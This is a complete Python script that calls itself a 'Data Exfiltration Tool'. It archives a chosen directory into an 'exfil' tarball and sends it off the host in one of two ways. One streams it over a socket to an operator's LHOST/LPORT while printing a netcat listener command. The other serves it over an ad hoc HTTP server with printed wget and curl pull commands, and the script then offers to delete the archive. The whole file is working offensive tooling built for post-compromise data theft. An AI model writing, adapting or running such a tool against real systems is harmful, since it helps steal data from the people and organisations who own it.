#!/usr/bin/env python3
"""
Data Exfiltration Tool
Supports multiple transfer methods with progress indication
"""

import os
import sys
import socket
import subprocess
import tarfile
import tempfile
import shutil
from pathlib import Path
import time

class Colors:
    """ANSI color codes for terminal output"""
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

def print_status(message, color=Colors.CYAN):
    """Print status message with color"""
    print(f"{color}[*]{Colors.RESET} {message}")

def print_success(message):
    """Print success message"""
    print(f"{Colors.GREEN}[+]{Colors.RESET} {message}")

def print_error(message):
    """Print error message"""
    print(f"{Colors.RED}[-]{Colors.RESET} {message}")

def print_warning(message):
    """Print warning message"""
    print(f"{Colors.YELLOW}[!]{Colors.RESET} {message}")

def check_connectivity(host, port, timeout=5):
    """Check if we can connect to the target host and port"""
    print_status(f"Checking connectivity to {host}:{port}...")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, int(port)))
        sock.close()
        if result == 0:
            print_success(f"Connection to {host}:{port} successful!")
            return True
        else:
            print_error(f"Cannot connect to {host}:{port}")
            return False
    except Exception as e:
        print_error(f"Connection check failed: {e}")
        return False

def create_archive(source_path, output_path):
    """Create a compressed tar archive of the source path"""
    print_status(f"Creating archive of {source_path}...")
    
    if not os.path.exists(source_path):
        print_error(f"Source path does not exist: {source_path}")
        return False
    
    try:
        # Get size for progress indication
        if os.path.isdir(source_path):
            total_size = sum(f.stat().st_size for f in Path(source_path).rglob('*') if f.is_file())
        else:
            total_size = os.path.getsize(source_path)
        
        print_status(f"Total size to archive: {total_size / (1024*1024):.2f} MB")
        
        # Create archive
        with tarfile.open(output_path, 'w:gz') as tar:
            print_status("Compressing files...")
            tar.add(source_path, arcname=os.path.basename(source_path))
        
        archive_size = os.path.getsize(output_path)
        print_success(f"Archive created: {output_path} ({archive_size / (1024*1024):.2f} MB)")
        return True
        
    except Exception as e:
        print_error(f"Failed to create archive: {e}")
        return False

def transfer_via_netcat(host, port, file_path):
    """Transfer file using netcat"""
    print_status(f"Transferring {file_path} to {host}:{port} via netcat...")
    
    file_size = os.path.getsize(file_path)
    print_status(f"File size: {file_size / (1024*1024):.2f} MB")
    
    try:
        # Start netcat listener command (user runs this on their machine)
        print_warning("On your local machine, run:")
        print(f"  {Colors.BOLD}nc -l -p {port} > {os.path.basename(file_path)}{Colors.RESET}")
        print()
        print_status("Waiting 5 seconds for you to start the listener...")
        time.sleep(5)
        
        # Send file via netcat
        print_status("Sending file...")
        with open(file_path, 'rb') as f:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, int(port)))
            
            # Transfer with progress
            sent = 0
            chunk_size = 8192
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                sock.sendall(chunk)
                sent += len(chunk)
                progress = (sent / file_size) * 100
                print(f"\r{Colors.CYAN}[*]{Colors.RESET} Progress: {progress:.1f}% ({sent / (1024*1024):.2f} MB / {file_size / (1024*1024):.2f} MB)", end='', flush=True)
            
            sock.close()
            print()
            print_success("Transfer complete!")
            return True
            
    except Exception as e:
        print_error(f"Transfer failed: {e}")
        return False

def transfer_via_http_server(file_path, port=8000):
    """Start HTTP server to serve the file"""
    print_status(f"Starting HTTP server on port {port}...")
    print_status(f"Serving file: {file_path}")
    print()
    print_warning("On your local machine, run:")
    print(f"  {Colors.BOLD}wget http://$(hostname -I | awk '{{print $1}}'):{port}/{os.path.basename(file_path)}{Colors.RESET}")
    print(f"  {Colors.BOLD}curl http://$(hostname -I | awk '{{print $1}}'):{port}/{os.path.basename(file_path)} -o {os.path.basename(file_path)}{Colors.RESET}")
    print()
    
    # Get server IP
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        server_ip = s.getsockname()[0]
        s.close()
        print_status(f"Server IP: {server_ip}")
        print_warning(f"Alternative: wget http://{server_ip}:{port}/{os.path.basename(file_path)}")
    except:
        print_warning("Could not determine server IP automatically")
    
    print()
    print_status("Press Ctrl+C to stop the server after download completes")
    print()
    
    # Change to file directory and start server
    file_dir = os.path.dirname(os.path.abspath(file_path))
    file_name = os.path.basename(file_path)
    os.chdir(file_dir)
    
    try:
        import http.server
        import socketserver
        
        Handler = http.server.SimpleHTTPRequestHandler
        with socketserver.TCPServer(("", port), Handler) as httpd:
            print_success(f"HTTP server running on port {port}")
            print_status("Waiting for download...")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print()
        print_success("Server stopped")
    except Exception as e:
        print_error(f"HTTP server failed: {e}")
        return False

def main():
    """Main exfiltration function"""
    print(f"{Colors.BOLD}{Colors.CYAN}")
    print("=" * 60)
    print("  Data Exfiltration Tool")
    print("=" * 60)
    print(f"{Colors.RESET}")
    
    # Get exfiltration data path
    print()
    exfil_path = input(f"{Colors.CYAN}[?]{Colors.RESET} Exfil data path: ").strip()
    
    if not exfil_path:
        print_error("No path provided")
        sys.exit(1)
    
    # Expand user home directory
    exfil_path = os.path.expanduser(exfil_path)
    
    # Get transfer method
    print()
    print("Transfer methods:")
    print("  1) Netcat (direct connection)")
    print("  2) HTTP Server (web download)")
    print()
    method = input(f"{Colors.CYAN}[?]{Colors.RESET} Choose method (1 or 2): ").strip()
    
    # Create temporary archive
    temp_dir = tempfile.gettempdir()
    archive_name = f"exfil_{int(time.time())}.tar.gz"
    archive_path = os.path.join(temp_dir, archive_name)
    
    # Create archive
    if not create_archive(exfil_path, archive_path):
        sys.exit(1)
    
    print()
    
    # Transfer based on method
    if method == "1":
        # Netcat method
        lhost = input(f"{Colors.CYAN}[?]{Colors.RESET} LHOST: ").strip()
        lport = input(f"{Colors.CYAN}[?]{Colors.RESET} LPORT: ").strip()
        
        if not lhost or not lport:
            print_error("LHOST and LPORT required")
            sys.exit(1)
        
        if not check_connectivity(lhost, lport):
            print_error("Cannot establish connection. Check your listener.")
            sys.exit(1)
        
        transfer_via_netcat(lhost, lport, archive_path)
        
    elif method == "2":
        # HTTP server method
        port = input(f"{Colors.CYAN}[?]{Colors.RESET} Server port (default 8000): ").strip() or "8000"
        transfer_via_http_server(archive_path, int(port))
    else:
        print_error("Invalid method")
        sys.exit(1)
    
    # Cleanup
    print()
    cleanup = input(f"{Colors.CYAN}[?]{Colors.RESET} Delete archive? (y/n): ").strip().lower()
    if cleanup == 'y':
        try:
            os.remove(archive_path)
            print_success("Archive deleted")
        except:
            print_warning("Could not delete archive")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print()
        print_warning("Interrupted by user")
        sys.exit(1)

